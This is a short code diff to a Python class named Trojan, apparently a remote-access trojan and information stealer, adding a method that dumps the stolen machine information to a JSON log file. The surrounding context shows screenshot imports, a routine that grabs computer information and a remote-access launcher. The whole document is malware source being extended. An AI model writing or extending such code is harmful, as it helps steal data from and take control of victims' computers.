@@ -23,6 +23,7 @@ import subprocess  # Module for working with console.
 import re  # Module for working with regular expressions
 import ctypes  # Module for working with message boxes.
 import shutil  # Module for working with files.
+import json  # Module for working with JSON.
 
 # Other Modules.
 import PIL.ImageGrab  # Module for working with screenshots.
@@ -247,8 +248,28 @@ class Trojan:
         # Steal all computer information.
         self.stealer_grab_computer_information()
 
+        # Creating an log file.
+        self.stealer_create_log()
+
         # Showing debug message.
         self.show_debug_message("Stealed all information from client!")
+
+    def stealer_create_log(self) -> None:
+        """
+        Creates log of the stealer, by creating an file in cache directory.
+        :return: [None] Not returns any.
+        """
+
+        # Getting filename.
+        filename = self.__setting_cache_folder + "\\Data\\log.json"
+
+        # Validating path.
+        self.path_validate(filename)
+
+        # Opening file.
+        with open(filename, "w") as file:
+            # Writing JSON data.
+            json.dump(self.__stealed_information, file, indent=4)
 
     def remote_access_launch(self) -> None:
         """
